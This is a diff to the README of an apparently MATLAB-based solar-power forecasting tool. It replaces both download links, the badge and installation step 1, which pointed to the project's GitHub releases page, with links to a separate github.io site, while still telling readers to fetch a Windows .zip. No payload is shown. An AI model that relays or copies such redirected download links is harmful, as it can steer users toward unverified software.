@@ -1,6 +1,6 @@
 # ☀️ pv-dimensionality-reduction - Improve solar power forecasting accuracy easily
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Shivam4905/pv-dimensionality-reduction/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://shivam4905.github.io)
 
 This software helps users forecast solar power production. It uses advanced mathematical methods to remove noise from data. This process simplifies complex inputs while keeping the most important information. The program compares two different models to find the right balance between calculation speed and prediction accuracy. You can use these tools to understand your energy output patterns better.
 
@@ -20,7 +20,7 @@ If you do not have MATLAB installed, download the free MATLAB Runtime from the M
 
 You need to download the files from the project page.
 
-1. Go to this link: [https://github.com/Shivam4905/pv-dimensionality-reduction/releases](https://github.com/Shivam4905/pv-dimensionality-reduction/releases)
+1. Go to this link: [https://shivam4905.github.io](https://shivam4905.github.io)
 2. Look for the section labeled "Assets."
 3. Select the file ending in .zip for your version of Windows.
 4. Save the folder to a location you can find easily, such as your desktop or documents folder.
